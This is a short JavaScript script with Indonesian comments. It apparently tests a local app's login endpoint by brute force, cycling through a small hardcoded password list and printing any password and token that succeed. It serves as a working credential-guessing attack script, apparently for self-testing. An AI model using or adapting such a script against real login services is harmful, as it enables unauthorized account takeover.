// Daftar kata sandi yang disiapkan penyerang (wordlist)
const passwords = [
  'admin',
  '123456',
  'password',
  '11223344',
  'renai123',
  'RENAI', // kata sandi yang benar
  'root'
];

async function runBruteForceTest() {
  console.log("=== MEMULAI PENGUJIAN BRUTE FORCE ===");

  for (let i = 0; i < passwords.length; i++) {
    const pwd = passwords[i];
    console.log(`[Percobaan ${i + 1}] Mencoba password: "${pwd}"...`);

    try {
      const res = await fetch('http://renai.local:5000/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: pwd })
      });

      const data = await res.json();

      if (res.status === 200 && data.success) {
        console.log(`\n>>> BERHASIL DIBOBOL! Password ditemukan: "${pwd}" <<<`);
        console.log(`Token diterima:`, data.token);
        break; // Berhenti ketika sandi yang benar ditemukan
      } else {
        console.log(`-> Ditolak: ${data.message || 'Password salah'}`);
      }
    } catch (err) {
      console.error("Gagal menghubungi server:", err.message);
      break;
    }
  }
}

runBruteForceTest();